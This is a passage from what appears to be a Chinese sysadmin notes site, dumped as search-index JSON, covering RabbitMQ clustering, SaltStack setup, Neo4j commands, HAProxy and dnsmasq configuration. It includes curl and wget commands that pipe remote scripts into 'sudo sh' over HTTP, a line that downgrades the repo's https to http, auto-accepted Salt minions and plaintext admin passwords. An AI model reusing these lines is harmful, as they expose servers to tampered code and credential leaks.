\npython-txamqp-0.3\n</code></pre>"},{"location":"daily/37-rabbitmq/#33-case-3","title":"3.3 case 3","text":"<pre><code># Cluster \u642d\u5efa\u4e0e\u4f7f\u7528\n\n# \u53c2\u8003\u5b98\u65b9\u6587\u6863 https://www.rabbitmq.com/clustering.html\n\n# \u524d\u9898\uff1a\n# 1\uff0cErlang \u4e0e RabbitMQ_Server \u7248\u672c\u4e00\u81f4\n# 2\uff0cRabbitMQ_Server \u4f7f\u7528\u7684 cookies \u4e00\u81f4\n\n# \u6f14\u793a\u64cd\u4f5c\nnode0: 192.168.1.50/24\nnode1: 192.168.1.51/24\nnode2: 192.168.1.52/24\n\n# \u914d\u7f6e hosts \u4fe1\u606f or \u5185\u90e8 dns \u4fe1\u606f\n10.0.10.50  s50\n10.0.10.51  s51\n10.0.10.52  s52\n\n# \u7b2c\u4e00\u6b65\uff1a\u542f\u52a8\u5404\u8282\u70b9 rabbitmq_server,\u542f\u52a8 rabbitmq_server\nrabbitmq_server -detached\n\n# \u67e5\u770b\u96c6\u7fa4\u72b6\u6001\nrabbitmqctl cluster_status\n\n[{nodes,[{disc,[rabbit@s50]}]},{running_nodes,[rabbit@s50]},{partitions,[]}]\nor\n[\n    {nodes,\n        [\n            {disc,\n                [rabbit@s50]\n            }\n        ]\n    },\n    {\n        running_nodes,\n        [rabbit@s50]\n    },\n    {partitions,[]}\n]\n\n# \u7b2c\u4e8c\u6b65\uff1a\u540c\u6b65 cookie \n\n# \u505c\u6b62 node2 rabbitmq-server\nrabbitmqctl stop_app\n/root/.erlang.cookie\n\n# \u7b2c\u4e09\u6b65\uff1a\u5c06 node2 \u52a0\u5165\u96c6\u7fa4\n\n# \u542f\u52a8 node2 --&gt; rabbitmq-server \nrabbitmqctl stop_app\nrabbitmqctl join_cluster --ram rabbit@s50\nrabbitmqctl start_app\n\n# ---- \u8fd9\u6837 cluster \u5c31\u642d\u5efa\u8d77\u6765\u4e86\n\n# \u9a8c\u8bc1\u6548\u679c  rabbitmqctl list_queues\n\n# \u542f\u52a8\u8282\u70b9\u76d1\u63a7\u4ee3\u7406\nrabbitmqctl stop\nrabbitmq-plugins enable rabbitmq_management_agent\nrabbitmq-plugins list\nrabbitmq-server -detached\n\n# \u7b2c\u56db\u6b65\uff1a\u8282\u70b9\u7ba1\u7406,\u6539\u53d8\u8282\u70b9\u7c7b\u578b\uff08\u975e\u5fc5\u987b\uff09\nrabbitmqctl stop_app\nrabbitmqctl change_cluster_node_type disc\nrabbitmqctl start_app\n\nrabbitmqctl cluster_status\n\n# \u4e3b\u52a8\u8131\u79bb\u96c6\u7fa4,\u8fdb\u5165node1\nrabbitmqctl stop_app\nrabbitmqctl reset\nrabbitmqct1 start_app\n\n# \u518d\u67e5\u770b\u96c6\u7fa4\u72b6\u6001\uff0c\u548c\u8131\u79bb\u8282\u70b9\u72b6\u6001 cluster_status\n\n# \u96c6\u7fa4\u4e22\u5f03\u8282\u70b9,\u8fdb\u5165node2\nrabbitmqctl stop_app\n\n# \u8fdb\u5165node1\nrabbitmqctl forget_cluster_node rabbit@s52\n\n# \u7b2c\u4e94\u6b65\uff1a\u4f7f\u7528 rabbitmq.conf &amp; rabbitmq-env.conf \u914d\u7f6e\u542f\u52a8\u670d\u52a1\n\n# \u53c2\u8003\nhttps://www.rabbitmq.com/configure.html#configuration-file\nhttp://www.erlang.org/doc/man/config.html\n\n/usr/local/rabbitmq_server-3.2.4/etc/rabbitmq/rabbitmq-env.conf\n/usr/local/rabbitmq_server-3.2.4/etc/rabbitmq/rabbitmq.conf\nor\n/etc/rabbitmq/rabbitmq.conf\n\n# ================================================================================\n\n# \u6ce8\u610f\u4f7f\u7528\u533a\u522b\n\nrabbitmq-server -detached ==&gt; rabbitmqctl stop\nrabbitmqctl start_app     ==&gt; rabbitmqctl stop_app\n\n\n# Web API \u63d2\u4ef6\nrabbitmq_web_stomp                      web \u63a5\u53e3\nrabbitmq_web_stomp_examples             \u5b9e\u4f8b\nRabbitMQ Management HTTP API            \u6240\u6709\u529f\u80fd\u63a5\u53e3\n\n# ================================================================================\n\n# \u6307\u5b9a\u914d\u7f6e\u642d\u5efa\u96c6\u7fa4 Cluster\n\nRABBITMQ_CONFIG_FILE=/usr/local/rabbitmq_server-3.2.4/etc/rabbitmq/rabbitmq_r1 RABBITMQ_NODE_PORT=5671 RABBITMQ_SERVER_START_ARGS=\"-rabbitmq_management listener [{port,15671}]\" RABBITMQ_NODENAME=r1 /usr/local/rabbitmq_server-3.2.4/sbin/rabbitmq-server -detached\nsleep 5\nRABBITMQ_CONFIG_FILE=/usr/local/rabbitmq_server-3.2.4/etc/rabbitmq/rabbitmq_r2 RABBITMQ_NODE_PORT=5672 RABBITMQ_SERVER_START_ARGS=\"-rabbitmq_management listener [{port,15672}]\" RABBITMQ_NODENAME=r2 /usr/local/rabbitmq_server-3.2.4/sbin/rabbitmq-server -detached\nsleep 5\nRABBITMQ_CONFIG_FILE=/usr/local/rabbitmq_server-3.2.4/etc/rabbitmq/rabbitmq_r3 RABBITMQ_NODE_PORT=5673 RABBITMQ_SERVER_START_ARGS=\"-rabbitmq_management listener [{port,15673}]\" RABBITMQ_NODENAME=r3 /usr/local/rabbitmq_server-3.2.4/sbin/rabbitmq-server -detached\n\nrabbitmqctl -n r2@s151 stop_app\nrabbitmqctl -n r2@s151 change_cluster_node_type ram\nrabbitmqctl -n r2@s151 start_app\nrabbitmqctl -n r2@s151 cluster_status\n\nrabbitmqctl -n r3@s151 stop_app\nrabbitmqctl -n r3@s151 change_cluster_node_type ram\nrabbitmqctl -n r3@s151 start_app\nrabbitmqctl -n r3@s151 cluster_status\n\nrabbitmqctl -n r1 stop\nrabbitmqctl -n r2 stop\nrabbitmqctl -n r3 stop\n\n# \u955c\u50cf\u961f\u5217,\u5168\u90e8\u955c\u50cf \nrabbitmqctl -n r1@s151 set_policy ha-all \"^ha.\" '{\"ha-mode\":\"all\"}'\nrabbitmqctl -n r1@s151 set_policy ha-queue \"^queue\" '{\"ha-mode\":\"all\"}'\nrabbitmqctl -n r1@s151 set_policy ha-uplus \"^uplus\" '{\"ha-mode\":\"all\"}'\n\n# \u6307\u5b9a\u4e2a\u6570\u7684\u955c\u50cf\uff0c\u4efb\u610f\u4e24\u4e2a\u8282\u70b9\u673a\u5668 \n\nrabbitmqctl -n r1@s151 set_policy ha-test-exactly \"^test.exactly\" '{\"ha-mode\":\"exactly\",\"ha-params\":2}'\n\n# \u6307\u5b9a\u56fa\u5b9a\u51e0\u4e2a\u8282\u70b9\u5185\u955c\u50cf\n\nrabbitmqctl -n r1@s151 set_policy ha-test-nodes \"^test.nodes\" '{\"ha-mode\":\"nodes\",\"ha-params\":[\"r1@s151\",\"r2@s151\"]}'\n</code></pre>"},{"location":"daily/37-rabbitmq/#34","title":"3.4 \u91cd\u542f\u5931\u8d25","text":"<pre><code># \u91ca\u653e\u6240\u6709\u8fdb\u7a0b\nkill $pid\n\n# \u53cd\u590d\u542f\u52a8\nsystemctl start rabbitmq-server\n</code></pre>"},{"location":"daily/38-saltstack/","title":"saltstack","text":"<pre><code># 1\uff0c\u6e90\u5b89\u88c5 \n# For RHEL 5:\n\nrpm -Uvh http://mirror.pnl.gov/epel/5/i386/epel-release-5-4.noarch.rpm\n\n# For RHEL 6:\nrpm -Uvh http://ftp.linux.ncsu.edu/pub/epel/6/i386/epel-release-6-8.noarch.rpm\nrpm -Uvh http://ftp.linux.ncsu.edu/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm\n\nsed -i 's/https:/http/g' /etc/yum.repos.d/epel.repo\n\n# 2\uff0c\u811a\u672c\u5b89\u88c5\n\nMany popular distributions will be able to install the salt minion by executing the bootstrap script:\n\nwget -O - http://bootstrap.saltstack.org | sudo sh\n\ncurl -L http://bootstrap.saltstack.org | sudo sh -s -M -N\n\n\n--------------------------------------------------------------------------------\n# \u6dfb\u52a0 salt yum \u5b89\u88c5\u6e90\n\ncat &gt; /etc/yum.repos.d/epel.repo &lt;&lt; EOF\n[epel]\nname=Extra Packages for Enterprise Linux 6 - \\$basearch\n#baseurl=http://download.fedoraproject.org/pub/epel/6/$basearch\nmirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-6&amp;arch=$basearch\nfailovermethod=priority\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6\n\n[epel-debuginfo]\nname=Extra Packages for Enterprise Linux 6 - \\$basearch - Debug\n#baseurl=http://download.fedoraproject.org/pub/epel/6/$basearch/debug\nmirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-debug-6&amp;arch=$basearch\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6\ngpgcheck=1\n\n[epel-source]\nname=Extra Packages for Enterprise Linux 6 - \\$basearch - Source\n#baseurl=http://download.fedoraproject.org/pub/epel/6/SRPMS\nmirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-source-6&amp;arch=$basearch\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6\ngpgcheck=1\n\nEOF\n\nyum install -y salt-master.noarch\nyum install -y salt-minion.noarch\n\nchkconfig --add salt-master\nchkconfig salt-master on\n\nchkconfig --add salt-minion\nchkconfig salt-minion on\n\n# 1, master \u914d\u7f6e\n\ncat /etc/salt/master\ninterface: 0.0.0.0\nauto_accept: True #(or False)\n\n2, minion\u914d\u7f6e\n\ncat /etc/salt/minion\nmaster: master.salt.youja.cn\nid: rabbitmq_10_81\n\n\n\n\n--------------------------------------------------------------------------------\n# salt-dashboard \u4f7f\u7528\uff08Web\u65b9\u5f0f\u4e4b\u4e00\uff0c\u6765\u6e90\u7f51\u53cb\uff09\n\nhttps://github.com/halfss/salt-dashboard\n\npython 2.6\ndjango 1.6\nhashlib\nMySQLdb\n\n\n--------------------------------------------------------------------------------\n# cherrypy/paste/gevent \u4f7f\u7528\uff08Web\u65b9\u5f0f\u4e4b\u4e8c\uff0c\u6765\u6e90\u5b98\u65b9\uff09\n\npython 2.6\n\nsalt-api\npython-cherrypy\n\nyum install -y make binutils gcc gcc-c++.x86_64 libgcc.x86_64 gcc.x86_64\nyum install -y openssl.x86_64 openssl-perl.x86_64 openssl-devel.x86_64 openssl-static.x86_64\nyum install -y libffi-devel.x86_64\n\n# Halite\u53ea\u652f\u63012014.1.0\u53ca\u66f4\u9ad8\u7248\u672c\u7684Salt\uff0c\u9ed8\u8ba4python-halite\u53ea\u4f1a\u5b89\u88c5CherryPy\nyum install python-devel\nyum install -y python-halite\nyum install -y python-pip\n/usr/bin/pip install -U halite\nyum install gcc\n/usr/bin/pip install pyopenssl\n\n/usr/bin/pip install CherryPy\n/usr/bin/pip install paste\n/usr/bin/pip install gevent\n\nvim /etc/salt/master\n\nexternal_auth:\n  pam:\n    testuser:\n      - .*\n      - '@runner'\n\n# \u5982\u679c\u60f3\u914d\u7f6echerrypy, \u8bf7\u5728/etc/salt/master\u6587\u4ef6\u5e95\u90e8\u589e\u52a0\u5982\u4e0b\u5185\u5bb9:\nhalite:\n  level: 'debug'\n  server: 'cherrypy'\n  host: '0.0.0.0'\n  port: '8080'\n  cors: False\n  tls: True\n  certpath: '/etc/pki/tls/certs/localhost.crt'\n  keypath: '/etc/pki/tls/certs/localhost.key'\n  pempath: '/etc/pki/tls/certs/localhost.pem'\n\n# \u5982\u679c\u4f60\u60f3\u4f7f\u7528paste\uff1a\nhalite:\n  level: 'debug'\n  server: 'paste'\n  host: '0.0.0.0'\n  port: '8080'\n  cors: False\n  tls: True\n  certpath: '/etc/pki/tls/certs/localhost.crt'\n  keypath: '/etc/pki/tls/certs/localhost.key'\n  pempath: '/etc/pki/tls/certs/localhost.pem'\n\n# \u4f7f\u7528gevent:\nhalite:\n  level: 'debug'\n  server: 'gevent'\n  host: '0.0.0.0'\n  port: '8080'\n  cors: False\n  tls: True\n  certpath: '/etc/pki/tls/certs/localhost.crt'\n  keypath: '/etc/pki/tls/certs/localhost.key'\n  pempath: '/etc/pki/tls/certs/localhost.pem'\n\n\ncd /etc/pki/tls/certs\nsalt-call tls.create_self_signed_cert tls # \u4f1a\u751f\u6210 crt,key \u6587\u4ef6\n\nopenssl req -new -x509 -key localhost.key -out localhost.pem -days 36500\n\n# \u6d4f\u89c8\u5668\u8bbf\u95ee\nhttps://localhost:8080/app\n\n# \u6dfb\u52a0 pem \u5230\u6d4f\u89c8\u5668\u8bc1\u4e66\n\n/etc/init.d/salt-master start\n/etc/init.d/salt-api start # \u8fd0\u884c\u5c31OK\uff0c\u4e0d\u4f1a\u5e38\u9a7b\n</code></pre>"},{"location":"daily/39-neo4j/","title":"neo4j","text":""},{"location":"daily/39-neo4j/#_1","title":"\u4e00\u3001\u5e38\u89c4\u64cd\u4f5c","text":"<pre><code># run: \n# mkdir -p /data1/lib/neo4j-5.7.0\n# docker run -d --rm --name=neo4j -p 7474:7474 -p 7687:7687 -v /data1/lib/neo4j-5.7.0:/data neo4j:5.7.0\n# mkdir -p /data1/lib/neo4j-4.4.20\n# docker run -d --rm --name=neo4j -p 7474:7474 -p 7687:7687 -v /data1/lib/neo4j-4.4.20:/data neo4j:4.4.20\n\n# browser: http://127.0.0.1:7474\n# connect: neo4j://127.0.0.1:7687\n\n# create\ncreate (:Person {name:\"A\",age:10})\ncreate (:Person {name:\"B\",age:15}),(:Person {name:\"C\",age:20})\ncreate (p1:Person {name:\"D\",age:25})-[:follow{name:\"follow start\"}]-&gt;(p2:Person {name:\"E\",age:30}) \ncreate (p:Person:Author:Teacher {name:\"F\",age:40,book:\"book name is F\",class:\"\u4e8c\u5e74\u7ea7\"}) return p\ncreate (:Author{name:\"F\",age:40})\nmerge (:Author{name:\"F\",age:40})\n\n# match\nmatch (p) return p limit 25\nmatch (p {name:\"A\"}) return p\nmatch (p {name:\"A\"}) return p.name,p.age\nmatch (p:Person) return p\nmatch (p:Person) where p.name = \"B\" return p\nmatch (p:Person{name:\"A\"}) set p.addr=\"\u4e0a\u6d77\" return p\nmatch (p:Person{name:\"A\"}) remove p.addr return p\nmatch (p:Person) return p order by p.age\nmatch (p) return p skip 2 limit 2\nmatch (p:Person) where p.age is not null return p\nmatch (p:Person) where p.age in [10,20,30] return p\nmatch (p:Person) return count(*) # max(p.age) min(p.age) sun(p.age) avg(p.age)\nmatch ()-[r:follow]-&gt;() return count(r)\nmatch ()-[r:follow]-&gt;() return id(r),type(r)\n\n# delete\nmatch ()-[r]-() delete r\nmatch (p:Person) delete p\n# detach same as delete r+p\nmatch (n) detach delete n \n\n# remove\nremove p:Person\nremove n.property\n\n# relation followers/following\nmatch (p:Person{name:\"A\"}) create (p)-[:follow{name:\"follower 1st\"}]-&gt;(:Person{name:\"G\"})\nmatch (p1:Person{name:\"A\"}),(p2:Person{name:\"B\"}) create (p1)-[:follow{name:\"follower 2nd\"}]-&gt;(p2)\nmatch (p1:Person{name:\"B\"}),(p2:Person{name:\"C\"}) create (p1)-[:follow{name:\"follower 3rd\"}]-&gt;(p2)\n\n# constraint\ncreate constraint on (p:Person) assert (p.name) is unique \ndrop constraint on (p:Person) assert (p.name) is unique\n\n# index\ncreate index on :Person (name,age)\ndrop index on :Person (name,age)\n</code></pre>"},{"location":"daily/39-neo4j/#_2","title":"\u4e8c\u3001\u4e00\u6b21\u7b14\u8bb0","text":"<pre><code># cypher-shell\ncypher-shell -a 10.101.11.236 -u neo4j -p neo4j --encryption=false\n\nneo4j-admin dump --database=graph.db --to=$(date +%s).db\nneo4j-admin load --from=./1492683962.db --database=graph.db\n\n# use\nUSING PERIODIC COMMIT 500\nLOAD CSV FROM 'http://neo4j.test.youja.cn/relation/last_active_10000.csv' AS line\nmerge (m:u:Y {i:line[0],m:line[1]})\nmerge (n:u:Y {i:line[2],m:line[3]})\nmerge (m)-[:u]-&gt;(n)\n\nwatch -n 10 'cypher-shell -a 10.10.121.101 -u neo4j -p youja --encryption=false \"match (n) return count(n) as COUNT\"'\n\n# batch-import: https://github.com/jexp/batch-import\n# neo4j-import: https://neo4j.com/docs/operations-manual/current/tutorial/import-tool/\n\n# test\nmatch(n) detach delete n\n\ncreate constraint on (n:u)\nassert n.i is unique\n\ncreate constraint on (n:Y)\nassert n.i is unique\n\ncreate constraint on (n:A)\nassert n.i is unique\n\nUSING PERIODIC COMMIT 100\nLOAD CSV FROM 'http://neo4j.test.youja.cn/relation/last_active_00500.csv' AS line\nmerge (m:u:Y {i:line[0],m:line[1]})\nmerge (n:u:Y {i:line[2],m:line[3]})\nmerge (m)-[:u]-&gt;(n)\n\n\nneo4j stop\n\nawk -F',' '{printf(\"%s,%s,u\\n%s,%s,u:Y\\n\",$1,$2,$3,$4)}' \\\nlast_active_10000.csv-10 | sort -u &gt; users.csv\nsed -i '1 i\\\\i:ID,m,:LABEL' users.csv\n\nawk -F',' '{printf(\"%s,%s,u\\n\",$1,$3)}' \\\nlast_active_10000.csv-10 | sort -u &gt; roles.csv\nsed -i '1 i\\\\:START_ID,:END_ID,:TYPE' roles.csv\n\nrm -rf /data/neo4j/data/databases/graph.db\n\nneo4j-import --into /data/neo4j/data/databases/graph.db \\\n  --nodes users.csv \\\n  --relationships roles.csv \\\n  --delimiter \",\" \\\n  --array-delimiter \":\" --quote \"\\\"\"\n\nneo4j start\n\n# ---\n\ncurl -s -o users.csv http://neo4j.8ops.top/relation/last_active_10000-users.csv\ncurl -s -o roles.csv http://neo4j.8ops.top/relation/last_active_10000-roles.csv\n\nneo4j stop\n\nrm -rf /data/neo4j/data/databases/graph.db\n\nneo4j-import --into /data/neo4j/data/databases/graph.db \\\n  --nodes users.csv \\\n  --relationships roles.csv \\\n  --delimiter \",\" \\\n  --array-delimiter \":\" --quote \"\\\"\" \\\n  --skip-duplicate-nodes\n\nneo4j start\n</code></pre>"},{"location":"daily/40-haproxy/","title":"haproxy","text":""},{"location":"daily/40-haproxy/#_1","title":"\u4e00\u3001\u80cc\u666f\u63cf\u8ff0","text":"<p>\u7ed3\u6784\u548c\u9884\u671f\u6548\u679c</p> <p></p> <p>\u6a21\u62df\u8bbe\u5b9a</p> <ul> <li>\u6b64\u5904\u6a21\u62df\u5165\u53e3\u57df\u540d <code>abc.8ops.top</code></li> <li>\u540e\u7aef\u670d\u52a1 <code>backend_world</code> \u7531<code>127.0.0.1:5001</code>\u548c<code>127.0.0.1:5002</code>\u4e24\u4e2a\u5b9e\u4f8b\u63d0\u4f9b\u670d\u52a1</li> <li>\u540e\u7aef\u670d\u52a1 <code>backend_number</code> \u7531<code>127.0.0.1:5003</code>\u548c<code>127.0.0.1:5004</code>\u4e24\u4e2a\u5b9e\u4f8b\u63d0\u4f9b\u670d\u52a1</li> <li>\u8d1f\u8f7d\u7b56\u7565\u652f\u6301\u8f6e\u6d35\u3001\u6700\u5c11\u8fde\u63a5\u3001\u76f8\u5e94\u6743\u91cd\uff0c\u6b64\u5904\u6f14\u793a\u8f6e\u6d35</li> </ul>"},{"location":"daily/40-haproxy/#_2","title":"\u4e8c\u3001\u6f14\u793a\u6548\u679c","text":""},{"location":"daily/40-haproxy/#21-80-443","title":"2.1 \u6548\u679c\u4e00\uff1a80-&gt;443 \u91cd\u5b9a\u5411","text":""},{"location":"daily/40-haproxy/#22-https","title":"2.2 \u6548\u679c\u4e8c\uff1aHTTPS","text":""},{"location":"daily/40-haproxy/#23-url","title":"2.3 \u6548\u679c\u4e09\uff1aURL\u8def\u7531","text":"<p>\u8def\u7531\u5217\u8868</p> <ul> <li>\u8def\u75311\uff1a/a, /b, /c \u5206\u53d1\u5230\u540e\u7aef\u670d\u52a1 <code>backend_world</code></li> <li>\u8def\u75312\uff1a/1, /2, /3 \u5206\u53d1\u5230\u540e\u7aef\u670d\u52a1 <code>backend_number</code></li> </ul> <p></p> <p></p>"},{"location":"daily/40-haproxy/#24-xff","title":"2.4 \u6548\u679c\u56db\uff1aXFF\u5ba2\u6237\u7aef\u5199\u5165","text":""},{"location":"daily/40-haproxy/#_3","title":"\u4e09\u3001\u63a7\u5236\u53f0","text":""},{"location":"daily/40-haproxy/#_4","title":"\u56db\u3001\u914d\u7f6e","text":"<pre><code>global\n    log         127.0.0.1 local2\n\n    chroot      /var/lib/haproxy\n    pidfile     /var/run/haproxy.pid\n    maxconn     4000\n    user        haproxy\n    group       haproxy\n    daemon\n\n    # turn on stats unix socket\n    stats socket /var/lib/haproxy/stats\n\n    # utilize system-wide crypto-policies\n    ssl-default-bind-ciphers PROFILE=SYSTEM\n    ssl-default-server-ciphers PROFILE=SYSTEM\n\n    tune.ssl.default-dh-param 2048\n\n#---------------------------------------------------------------------\n# common defaults that all the 'listen' and 'backend' sections will\n# use if not designated in their block\n#---------------------------------------------------------------------\ndefaults\n    mode                    http\n    log                     global\n    option                  httplog\n    option                  dontlognull\n    option http-server-close\n    option forwardfor       except 127.0.0.0/8\n    option                  redispatch\n    retries                 3\n    timeout http-request    10s\n    timeout queue           1m\n    timeout connect         10s\n    timeout client          1m\n    timeout server          1m\n    timeout http-keep-alive 10s\n    timeout check           10s\n    maxconn                 3000\n\nlisten admin_stats\n    mode http\n    bind 0.0.0.0:9200\n    stats enable\n    log global\n    stats refresh 10s\n    stats uri /stats\n    stats realm Haproxy Manager\n    stats auth admin:8ops\n    stats hide-version\n    stats admin if TRUE\n\n#---------------------------------------------------------------------\n# main frontend which proxys to the backends\n#---------------------------------------------------------------------\nfrontend frontend_abc\n    mode http\n    bind :80\n    bind :443 ssl crt /opt/static/8ops.top.pem\n    bind :::80\n    bind :::443 ssl crt /opt/static/8ops.top.pem\n    http-request redirect scheme https unless { ssl_fc }\n\n    # acl hdr_abc hdr -i abc.8ops.top\n    # acl hdr_abc hdr_dom(host) -i abc.8ops.top\n    acl hdr_abc hdr_beg(host) -i abc.8ops.top\n    option  forwardfor\n    option  forceclose\n    option  httplog\n\n    acl uri_world     path_beg       -i  /a /b /c\n    acl uri_number    path_beg       -i  /1 /2 /3\n    acl uri_stats     path_beg       -i /stats\n\n    use_backend       backend_world  if uri_world\n    use_backend       backend_number if uri_number\n    use_backend       backend_stats  if uri_stats\n    default_backend                  backend_default\n\nbackend backend_default\n    balance roundrobin\n    server  app_5000 127.0.0.1:5000 check\n\nbackend backend_world\n    balance roundrobin\n    server  app_5001 127.0.0.1:5001 check\n    server  app_5002 127.0.0.1:5002 check\n\nbackend backend_number\n    balance roundrobin\n    server  app_5003 127.0.0.1:5003 check\n    server  app_5004 127.0.0.1:5004 check\n\nbackend backend_stats\n    server  app  127.0.0.1:9200 check\n</code></pre>"},{"location":"daily/41-dnsmasq/","title":"dnsmasq","text":""},{"location":"daily/41-dnsmasq/#_1","title":"\u4e00\u3001\u914d\u7f6e","text":"<p>dnsmasq\u7ecf\u5e38\u4fee\u6539\u7684\u6bd4\u8f83\u91cd\u8981\u53c2\u6570\u8bf4\u660e</p> \u5177\u4f53\u53c2\u6570 \u53c2\u6570\u8bf4\u660e resolv-file \u5b9a\u4e49dnsmasq\u4ece\u54ea\u91cc\u83b7\u53d6\u4e0a\u6e38DNS\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c \u9ed8\u8ba4\u4ece/etc/resolv.conf\u83b7\u53d6\u3002 strict-order \u8868\u793a\u4e25\u683c\u6309\u7167resolv-file\u6587\u4ef6\u4e2d\u7684\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b\u8fdb\u884cDNS\u89e3\u6790\uff0c\u76f4\u5230\u7b2c\u4e00\u4e2a\u89e3\u6790\u6210\u529f\u4e3a\u6b62\u3002 listen-address \u5b9a\u4e49dnsmasq\u76d1\u542c\u7684\u5730\u5740\uff0c\u9ed8\u8ba4\u662f\u76d1\u63a7\u672c\u673a\u7684\u6240\u6709\u7f51\u5361\u4e0a\u3002 address \u542f\u7528\u6cdb\u57df\u540d\u89e3\u6790\uff0c\u5373\u81ea\u5b9a\u4e49\u89e3\u6790a\u8bb0\u5f55\uff0c\u4f8b\u5982\uff1aaddress=/long.com/192.168.115.10 \u8bbf\u95eelong.com\u65f6\u7684\u6240\u6709\u57df\u540d\u90fd\u4f1a\u88ab\u89e3\u6790\u6210192.168.115.10 bogus-nxdomain \u5bf9\u4e8e\u4efb\u4f55\u88ab\u89e3\u6790\u5230\u6b64 IP \u7684\u57df\u540d\uff0c\u5c06\u54cd\u5e94 NXDOMAIN \u4f7f\u5176\u89e3\u6790\u5931\u6548\uff0c\u53ef\u4ee5\u591a\u6b21\u6307\u5b9a \u901a\u5e38\u7528\u4e8e\u5bf9\u4e8e\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u57df\u540d\uff0c\u7981\u6b62\u5176\u8df3\u8f6c\u5230\u8fd0\u8425\u5546\u7684\u5e7f\u544a\u7ad9\u70b9 server \u6307\u5b9a\u4f7f\u7528\u54ea\u4e2aDNS\u670d\u52a1\u5668\u8fdb\u884c\u89e3\u6790\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684\u7f51\u7ad9\u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u7684\u57df\u540d\u5bf9\u5e94\u89e3\u6790\u3002 \u4f8b\u5982\uff1aserver=/google.com/8.8.8.8    #\u8868\u793a\u5bf9\u4e8egoogle\u7684\u670d\u52a1\uff0c\u4f7f\u7528\u8c37\u6b4c\u7684DNS\u89e3\u6790\u3002 <p>cat /etc/dnsmasq.conf http://en.wikipedia.org/wiki/Dnsmasq </p> <pre><code>resolv-file=/etc/resolv.conf \nstrict-order \nlisten-address=10.10.10.82 \naddn-hosts=/etc/hosts \ndns-forward-max=500 \ncache-size=2000 \nneg-ttl=3600 \nmax-ttl=3600 \nmax-cache-ttl=3600 \nauth-ttl=3600\n</code></pre> <p>\u5b83\u53ef\u4ee5\u63d0\u4f9b\u5982\u4e0b\u51e0\u4e2a\u5b9e\u7528\u7684\u529f\u80fd\uff1a</p> <ol> <li>\u63d0\u4f9bdns\u670d\u52a1</li> <li>\u4f18\u5148\u4f7f\u7528\u672c\u5730\u81ea\u5b9a\u4e49dns</li> <li>\u63d0\u4f9bdhcp\u670d\u52a1</li> </ol> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u7528bind\u89e3\u51b3dns\u7684\u95ee\u9898\uff0cdhcpd\u89e3\u51b3dhcp\u7684\u95ee\u9898\uff0c\u53e6\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528ypbind\u89e3\u51b3\u81ea\u5b9a\u4e49hostname\u89e3\u6790\u7684ip\uff08\u5f53\u7136\u8fd8\u6709\u7528\u6237\u7684\u529f\u80fd\uff09\uff0c\u5b83\u90fd\u89e3\u51b3\u4e86\uff01\u5f88\u5b9e\u7528\u5427\uff1f\u8fd9\u771f\u7684\u5f88\u5438\u5f15\u4eba\uff0c\u51b5\u4e14\u5b83\u4e00\u76f4\u5728\u66f4\u65b0\u7ef4\u62a4\uff0c\u6700\u65b0\u7248\u672c\u662f6\u6708\u4efd\u7684\u3002</p> <p>\u5b89\u88c5\u8fc7\u7a0b\u5f88\u7b80\u5355\uff1a</p> <p>\u7f16\u8f91dnsmasq\u7684\u914d\u7f6e\u6587\u4ef6 vim /etc/dnsmasq.conf </p> <p>\u627e\u5230\u4e0b\u9762\u8fd9\u4e00\u9879 #resolv-file=</p> <p>\u7528\u4e0b\u9762\u7684\u4e00\u6761\u8bed\u53e5\u66ff\u6362 resolv-file=/etc/resolv.dnsmasq.conf</p> <p>\u5c06\u539fdns\u914d\u7f6e\u590d\u5236\u81f3resolv.dnsmasq.conf \u786e\u4fdd\u4f60\u6ca1\u6709\u66f4\u6539\u8fc7/etc/resolv.conf\u6587\u4ef6\uff0c\u5982\u679c\u6539\u8fc7\uff0c\u6062\u590d\u539f\u72b6</p> <p>cp /etc/resolv.conf /etc/resolv.dnsmasq.conf </p> <p>\u7f16\u8f91resolv.conf</p> <p>vim /etc/resolv.conf </p> <p>\u5c06\u5176\u4e2d\u7684\u57df\u540d\u670d\u52a1\u5668\u5168\u90e8\u53bb\u6389\uff0c\u52a0\u5165\u4ee5\u4e0b\u8fd9\u884c nameserver 127.0.0.1</p> <p>\u4fdd\u5b58\uff0c\u9000\u51fa dnsmasq\u53ef\u4ee5\u7528hosts\u6587\u4ef6\u6765\u8bbe\u7f6e\u57df\u540d\uff1a \u4f8b\uff1atest.sudone.com\u662f\u4e0d\u5b58\u5728\u7684\u57df\u540d\uff0c\u6211\u5728dnsmasq\u4e2d\u6307\u5411\u5230\u4e00\u4e2aip\u91cc\uff1a echo \"64.233.189.99 test.sudone.com\" &gt; /etc/dnsmasq.hosts  </p> <p>\u6539\u5b8c\u8981\u91cd\u542f\uff1a pkill -9 dnsmasp  &amp;&amp; /usr/local/sbin/dnsmasq -h\u6216/etc/init.d/dnsmasq restart </p> <p>/etc/dnsmasq.conf</p> <pre><code># \u4e0d\u52a0\u8f7d\u672c\u5730\u7684 /etc/hosts \u6587\u4ef6\n#no-hosts\n# \u6dfb\u52a0\u8bfb\u53d6\u989d\u5916\u7684 hosts \u6587\u4ef6\u8def\u5f84\uff0c\u53ef\u4ee5\u591a\u6b21\u6307\u5b9a\u3002\u5982\u679c\u6307\u5b9a\u4e3a\u76ee\u5f55\uff0c\u5219\u8bfb\u53d6\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u3002\n#addn-hosts=/etc/dnsmasq.hosts.d\n# \u8bfb\u53d6\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6\uff0c\u6587\u4ef6\u66f4\u65b0\u5c06\u81ea\u52a8\u8bfb\u53d6\n#hostsdir=/etc/dnsmasq.hosts.d\n# 